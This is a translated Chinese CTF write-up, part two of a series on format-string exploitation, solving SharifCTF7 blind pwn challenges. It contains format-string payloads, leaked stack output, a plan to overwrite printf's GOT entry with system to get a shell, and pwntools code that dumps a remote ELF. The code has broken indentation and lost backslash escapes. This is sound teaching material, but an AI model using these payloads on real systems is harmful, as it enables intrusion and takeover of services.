# 【技术分享】格式化字符串漏洞利用小结（二）
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
****
作者：[tianyi201612](http://bobao.360.cn/member/contribute?uid=2802113352)
稿费：300RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**传送门**
[**【技术分享】格式化字符串漏洞利用小结（一）**](http://bobao.360.cn/learning/detail/3654.html)
[**【CTF攻略】格式化字符串blind pwn详细教程** ****
****](http://bobao.360.cn/ctf/detail/189.html)
**1、无binary的格式化字符串漏洞利用**
无binary的格式化字符串漏洞赛题一般都只给一个远程地址，根据这篇文章（
）可知，这种题目叫“blind pwn”（那这里就是“blind formatstring”了），有点sql注入里面盲注的意思，挺好玩的。
这里选用sharifCTF7来举例，因为这个CTF的服务端至今还开放着，并且提供了三道从易到难的无binary格式化字符串漏洞利用题目，有兴趣的可以尝试一下。这三道题目也将格式化字符串漏洞利用的两种主要方式体现了出来，即“读取数据以泄漏信息”和“写入数据以获取控制权”。
**  
**
**2、sharifCTF7-Guess（pwn 50）**
* * *
    nc ctf.sharif.edu 54517
这题是将flag直接放置在栈中，用户可以输入format字符串并返回相应信息。通过构造类似“%x*n”这样的输入即可获得栈中的n字节信息，从而将隐藏在栈中的flag直接拿到。
通过输入%1$p可知目标系统是64位，然后使用%k$lx并一直增加k值。当k=136时，输出5443666972616853，hex转码后即为“TCfirahS”，说明马上就到flag了，继续增加k，结果如下。
    136 5443666972616853 TCfirahS
    137 3832346435617b46 824d5a{F
    138 6237636363323336 b7ccc236
    139 6136633735336466 a6c753df
    140 3561383761383231 5a87a821
    141 00007ff6007d6338 }c8
    Flag：SharifCTF{a5d428632ccc7bfd357c6a128a78a58c}
**3、sharifCTF7-NoMoreBlind（pwn 200）**
* * *
    nc ctf.sharif.edu 54514
这题可以无限次输入字符串，每次均可得到反馈。通过输入“%3$p%4$p”进行测试，我们可以确定目标系统是32bit的，且偏移为4。本题的flag不在栈上，需要通过getshell来寻找，主要思路如下：
通过格式化字符串漏洞，利用%s将目标ELF文件dump出来；
分析并修复返回的ELF文件；
通过逆向ELF文件，了解程序的基本流程以及所用libc函数的GOT以获得system函数的实际地址；
将system函数地址写入printf函数的GOT表项处；
通过输入“/bin/sh”，利用已被改为system地址的printf来获得shell。
**3.1 利用格式化字符串漏洞dump出ELF**
先给出代码吧，此代码修改自其他人的，特此说明。
    from pwn import *
    def leakELF(addr):
        p = None
      for i in range(5): #多循环几次，放置连接中断
          try:
            p = remote("ctf.sharif.edu", 54518, timeout=1)
          payload = "ABCD%7$sDCBA" + p32(addr)
          if ("x0a" in payload) or ("x00" in payload):
              log.warning("newline in payload!")
            return "xff"
          p.sendline(payload)
          print p.recvline()
          data2 = p.recvline()
          log.info(hexdump(data2))
          if data2:
              fr = data2.find("ABCD") + 4
            to = data2.find("DCBA")
            res = data2[fr:to]  #定位出泄漏的数据位置
            if res == "":    #说明要泄漏的数据就是x00
                return "x00"
            else:
              return res
          return "xff"  #如果出现异常，先返回xff
        except KeyboardInterrupt:
          raise
        except EOFError:
          log.debug("got EOF for leaking addr 0x{:x}".format(addr))
          pass
        except Exception:
          log.warning("got exception...", exc_info = sys.exc_info())
        finally:
            if p:
              p.close()
        return "xff"